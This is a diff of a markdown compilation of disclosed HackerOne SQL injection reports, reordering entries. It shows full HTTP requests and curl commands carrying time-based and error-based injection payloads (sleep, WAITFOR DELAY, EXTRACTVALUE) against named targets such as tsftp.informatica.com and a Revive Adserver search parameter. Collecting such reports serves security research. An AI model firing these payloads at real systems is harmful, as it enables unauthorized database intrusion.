@@ -512,6 +512,53 @@ Source: `hackerone/reports/2021/1069561.md` (https://hackerone.com/reports/10695
     Payload: acctid=1 AND (SELECT 8327 FROM (SELECT(SLEEP(5)))yrDl)
 ```
 
+## #2312334 Time based SQL injection at████████ — deptofdefense — - — SQL Injection
+Source: `hackerone/reports/2024/2312334.md` (https://hackerone.com/reports/2312334)
+
+```
+POST /pubs/index.php HTTP/1.1
+Host:██████
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Origin: https://███████
+Referer: https://███████/pubs/index.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+
+years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
+```
+
+```
+POST /pubs/index.php HTTP/1.1
+Host:█████████
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Origin: https://████████
+Referer: https://████/pubs/index.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+
+years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+```
+
 ## #3198980 Woocommerce SQL Injection in WC_Report_Coupon_Usage — automattic — - — SQL Injection
 Source: `hackerone/reports/2025/3198980.md` (https://hackerone.com/reports/3198980)
 
@@ -583,72 +630,6 @@ Source: `hackerone/reports/2025/3292573.md` (https://hackerone.com/reports/32925
         )
 ```
 
-## #2312334 Time based SQL injection at████████ — deptofdefense — - — SQL Injection
-Source: `hackerone/reports/2024/2312334.md` (https://hackerone.com/reports/2312334)
-
-```
-POST /pubs/index.php HTTP/1.1
-Host:██████
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 68
-Origin: https://███████
-Referer: https://███████/pubs/index.php
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Te: trailers
-Connection: close
-
-years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
-```
-
-```
-POST /pubs/index.php HTTP/1.1
-Host:█████████
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 68
-Origin: https://████████
-Referer: https://████/pubs/index.php
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Te: trailers
-Connection: close
-
-years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
-```
-
-## #3395221 Error-Based & Time-Based SQL Injection in 'keyword' Parameter of admin-search.php Allowing Full Database Access in Revive Adserver v6.0.0 — revive_adserver — - — SQL Injection
-Source: `hackerone/reports/2025/3395221.md` (https://hackerone.com/reports/3395221)
-
-```
-phpAds_registerGlobalUnslashed('keyword', 'client', 'campaign', 'banner', 'zone', 'affiliate', 'compact');
-```
-
-```
-$rsClients = $dalClients->getClientByKeyword($keyword, $agencyId);
-$rsCampaigns = $dalCampaigns->getCampaignAndClientByKeyword($keyword, $agencyId);
-$rsBanners = $dalBanners->getBannerByKeyword($keyword, $agencyId);
-$rsAffiliates = $dalAffiliates->getAffiliateByKeyword($keyword, $agencyId);
-$rsZones = $dalZones->getZoneByKeyword($keyword, $agencyId);
-```
-
-```
-Payload: keyword=FUZZ') AND EXTRACTVALUE(8429,CONCAT(0x5c,0x716a7a6a71,(SELECT (ELT(8429=8429,1))),0x7178787871))-- Nqvq&compact=t
-```
-
 ## #2209130 SQL Injection on prod.oidc-proxy.prod.webservices.mozgcp.net via invite_code parameter - Mozilla social inscription — mozilla — - — SQL Injection
 Source: `hackerone/reports/2024/2209130.md` (https://hackerone.com/reports/2209130)
 
@@ -682,6 +663,25 @@ invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--
 
 ```
 invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(10))--
+```
+
+## #3395221 Error-Based & Time-Based SQL Injection in 'keyword' Parameter of admin-search.php Allowing Full Database Access in Revive Adserver v6.0.0 — revive_adserver — - — SQL Injection
+Source: `hackerone/reports/2025/3395221.md` (https://hackerone.com/reports/3395221)
+
+```
+phpAds_registerGlobalUnslashed('keyword', 'client', 'campaign', 'banner', 'zone', 'affiliate', 'compact');
+```
+
+```
+$rsClients = $dalClients->getClientByKeyword($keyword, $agencyId);
+$rsCampaigns = $dalCampaigns->getCampaignAndClientByKeyword($keyword, $agencyId);
+$rsBanners = $dalBanners->getBannerByKeyword($keyword, $agencyId);
+$rsAffiliates = $dalAffiliates->getAffiliateByKeyword($keyword, $agencyId);
+$rsZones = $dalZones->getZoneByKeyword($keyword, $agencyId);
+```
+
+```
+Payload: keyword=FUZZ') AND EXTRACTVALUE(8429,CONCAT(0x5c,0x716a7a6a71,(SELECT (ELT(8429=8429,1))),0x7178787871))-- Nqvq&compact=t
 ```
 
 ## #2737595 SQL Injection — deptofdefense — - — SQL Injection
@@ -800,6 +800,19 @@ django-admin startproject sqli .
 python manage.py startapp webapp
 ```
 
+## #1034625 Blind SQL injection at tsftp.informatica.com — informatica — - — SQL Injection
+Source: `hackerone/reports/2020/1034625.md` (https://hackerone.com/reports/1034625)
+
+```
+$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
+{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total
+```
+
+```
+$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
+{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total
+```
+
 ## #2588426 SQL injection in JSONField KeyTransform — django — - — SQL Injection
 Source: `hackerone/reports/2025/2588426.md` (https://hackerone.com/reports/2588426)
 
@@ -840,19 +853,6 @@ Source: `hackerone/reports/2025/2588426.md` (https://hackerone.com/reports/25884
         ).annotate(
             count=Count("id"),
         )
-```
-
-## #1034625 Blind SQL injection at tsftp.informatica.com — informatica — - — SQL Injection
-Source: `hackerone/reports/2020/1034625.md` (https://hackerone.com/reports/1034625)
-
-```
-$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
-{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total
-```
-
-```
-$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
-{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total
 ```
 
 ## #2599826 Boolen Based Blind Sql Injection Via User Agent in ███.mil — deptofdefense — - — SQL Injection
